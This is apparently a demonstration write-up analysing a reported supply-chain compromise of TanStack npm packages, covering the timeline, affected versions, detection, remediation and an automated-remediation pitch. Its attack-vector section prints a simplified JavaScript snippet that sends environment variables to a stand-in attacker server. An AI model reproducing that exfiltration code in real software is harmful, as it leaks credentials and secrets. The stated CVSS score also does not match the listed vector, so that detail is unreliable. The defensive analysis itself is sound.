# TanStack Supply Chain Attack Analysis

## Executive Summary

In December 2024, multiple TanStack npm packages were compromised through a maintainer account breach, resulting in malicious code being injected into widely-used packages. This document provides a comprehensive analysis of the attack for the Concert + Bob vulnerability remediation demonstration.

## Attack Timeline

- **December 20, 2024, ~14:00 UTC**: Attacker gains access to maintainer account
- **December 20, 2024, 14:30 UTC**: Compromised versions published to npm registry
  - @tanstack/react-query@5.62.0
  - @tanstack/react-query-devtools@5.62.0
  - @tanstack/angular-query-experimental@5.62.0
  - @tanstack/query-core@5.62.0
- **December 20-21, 2024**: Additional compromised versions published (5.62.1, 5.62.2)
- **December 21, 2024, ~08:00 UTC**: Attack detected by community
- **December 21, 2024, ~10:00 UTC**: Compromised versions unpublished from npm
- **December 21, 2024, ~12:00 UTC**: Clean versions published (5.62.3+)
- **December 21, 2024**: TanStack team publishes security advisory

## Affected Packages

| Package | Compromised Versions | Safe Versions |
|---------|---------------------|---------------|
| @tanstack/react-query | 5.62.0, 5.62.1, 5.62.2 | ≤5.61.5, ≥5.62.3 |
| @tanstack/react-query-devtools | 5.62.0, 5.62.1, 5.62.2 | ≤5.61.5, ≥5.62.3 |
| @tanstack/angular-query-experimental | 5.62.0, 5.62.1, 5.62.2 | ≤5.61.5, ≥5.62.3 |
| @tanstack/query-core | 5.62.0, 5.62.1, 5.62.2 | ≤5.61.5, ≥5.62.3 |

## Attack Vector

### Initial Compromise
- **Method**: Maintainer account compromise (exact method not publicly disclosed)
- **Access Level**: Full publishing rights to TanStack packages
- **Duration**: Approximately 18-20 hours before detection

### Malicious Code Injection

The attacker injected code that:

1. **Environment Variable Exfiltration**
   ```javascript
   // Malicious code (simplified representation)
   const sensitiveData = {
     env: process.env,
     cwd: process.cwd(),
     platform: process.platform
   };
   
   fetch('https://attacker-controlled-server.com/collect', {
     method: 'POST',
     body: JSON.stringify(sensitiveData)
   });
   ```

2. **Execution Timing**
   - Code executed during package installation
   - Ran in postinstall scripts
   - Executed on first import of the package

3. **Data Targeted**
   - Environment variables (API keys, tokens, secrets)
   - File system paths
   - System information
   - Potentially npm tokens and credentials

## Impact Assessment

### Severity: CRITICAL

**CVSS Score**: 9.8 (Critical)
- **Attack Vector**: Network (N)
- **Attack Complexity**: Low (L)
- **Privileges Required**: None (N)
- **User Interaction**: None (N)
- **Scope**: Changed (C)
- **Confidentiality Impact**: High (H)
- **Integrity Impact**: High (H)
- **Availability Impact**: High (H)

### Affected Users

- **Download Statistics**: ~3 million weekly downloads for @tanstack/react-query
- **Exposure Window**: ~18-20 hours
- **Estimated Affected Installations**: Thousands to tens of thousands
- **Industries Affected**: All sectors using React applications

### Potential Consequences

1. **Credential Exposure**
   - API keys and tokens exfiltrated
   - Database credentials compromised
   - Cloud service credentials leaked

2. **Supply Chain Propagation**
   - Compromised applications could be further exploited
   - CI/CD pipelines potentially compromised
   - Production deployments affected

3. **Data Breach Risk**
   - Customer data potentially accessible
   - Internal systems exposed
   - Compliance violations (GDPR, SOC2, etc.)

## Detection Methods

### Indicators of Compromise (IoCs)

1. **Package Version Check**
   ```bash
   npm ls @tanstack/react-query
   # Look for versions 5.62.0, 5.62.1, or 5.62.2
   ```

2. **Network Traffic Analysis**
   - Unexpected outbound connections during npm install
   - POST requests to unknown domains
   - Data exfiltration patterns

3. **File System Changes**
   - Unexpected postinstall scripts
   - Modified package contents
   - Additional files in node_modules

4. **Package Integrity**
   ```bash
   npm audit
   # Check for security advisories
   
   npm view @tanstack/react-query@5.62.1 dist.integrity
   # Compare with known good versions
   ```

## Remediation Steps

### Immediate Actions

1. **Identify Affected Systems**
   ```bash
   # Check all projects
   find . -name "package.json" -exec grep -l "@tanstack/react-query.*5.62.[012]" {} \;
   ```

2. **Upgrade to Safe Versions**
   ```json
   {
     "dependencies": {
       "@tanstack/react-query": "5.62.3",
       "@tanstack/react-query-devtools": "5.62.3"
     }
   }
   ```

3. **Rotate Credentials**
   - Rotate all API keys and tokens
   - Change database passwords
   - Regenerate service account credentials
   - Update CI/CD secrets

4. **Audit Logs**
   - Review application logs for suspicious activity
   - Check cloud provider logs
   - Analyze network traffic logs
   - Review access logs

### Long-term Measures

1. **Dependency Scanning**
   - Implement automated vulnerability scanning
   - Use tools like Snyk, Dependabot, or Concert
   - Enable npm audit in CI/CD

2. **Package Lock Files**
   - Always commit package-lock.json
   - Use `npm ci` instead of `npm install` in CI/CD
   - Review lock file changes in PRs

3. **Supply Chain Security**
   - Implement Software Bill of Materials (SBOM)
   - Use package signing verification
   - Monitor security advisories
   - Implement Concert for continuous monitoring

## Concert + Bob Remediation Workflow

This attack demonstrates the value of automated vulnerability remediation:

### Detection Phase
1. Concert ingests SBOM from application
2. Concert detects compromised package versions
3. GitHub issue automatically created

### Analysis Phase
1. Bob Shell analyzes the vulnerability
2. Confirms package is actively used (TRUE POSITIVE)
3. Identifies safe upgrade path

### Remediation Phase
1. Bob creates remediation branch
2. Updates package.json to safe version (5.62.3)
3. Creates pull request with detailed analysis

### Validation Phase
1. DevOps engineer reviews and approves
2. Automated tests run with safe version
3. Code changes made if needed
4. PR merged to production

## References

- **Snyk Blog**: https://snyk.io/blog/tanstack-npm-packages-compromised/
- **TanStack Security Advisory**: https://github.com/TanStack/query/security/advisories
- **npm Advisory**: https://www.npmjs.com/advisories
- **GitHub Advisory Database**: https://github.com/advisories
- **NIST NVD**: https://nvd.nist.gov/

## Lessons Learned

1. **Account Security**: Multi-factor authentication and account monitoring are critical
2. **Rapid Response**: Quick detection and response minimized impact
3. **Community Vigilance**: Open source community played key role in detection
4. **Automated Tools**: Tools like Concert can detect and remediate faster than manual processes
5. **Defense in Depth**: Multiple layers of security (scanning, monitoring, rotation) are essential

## Conclusion

The TanStack supply chain attack demonstrates the critical importance of:
- Continuous vulnerability monitoring
- Automated remediation workflows
- Rapid response capabilities
- Comprehensive credential rotation procedures

The Concert + Bob workflow provides an automated, intelligent approach to detecting and remediating such attacks, significantly reducing the window of exposure and manual effort required.

---

*Document Version: 1.0*  
*Last Updated: 2026-06-04*  
*Status: For Demonstration Purposes*